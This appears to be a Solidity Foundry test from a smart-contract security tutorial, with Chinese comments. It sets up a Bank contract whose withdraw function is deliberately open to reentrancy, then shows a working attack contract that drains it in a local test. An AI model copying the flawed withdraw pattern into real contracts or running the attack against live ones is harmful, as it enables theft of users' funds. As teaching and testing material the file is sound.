// SPDX-License-Identifier: MIT
// by 0xAA
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract Bank {
    mapping(address => uint256) public balanceOf; // 余额mapping

    // 存入ether，并更新余额
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // 提取msg.sender的全部
    function withdraw() external {
        // 获取余额
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0, "Insufficient balance");
        // 转账 Token !!! 可能激活恶意合约的fallback/receive函数，有重入风险！
        (bool success,) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");
        // 更新余额
        balanceOf[msg.sender] = 0;
    }

    // 获取银行合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract AttackTest is Test {
    Bank public bank;
    // 初始化Bank合约地址

    function setUp() public {
        bank = new Bank();

        // 查看攻击前各合约余额
        console.log("attack balance before:", address(this).balance / 1e18);
        // 使用deal给bank合约100 eth
        deal(address(bank), 100 * 1e18);
        console.log("bank balance before:", address(bank).balance / 1e18);
    }

    // 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数
    receive() external payable {
        if (address(bank).balance >= 1) {
            bank.withdraw();
        }
    }

    // 攻击函数，调用时 msg.value 设为 1 ether
    function testattack() public {
        bank.deposit{value: 1 ether}();
        bank.withdraw();
        // 查看攻击后各合约余额
        console.log("attack balance after:", address(this).balance / 1e18);
        console.log("bank balance after:", address(bank).balance / 1e18);
    }
}
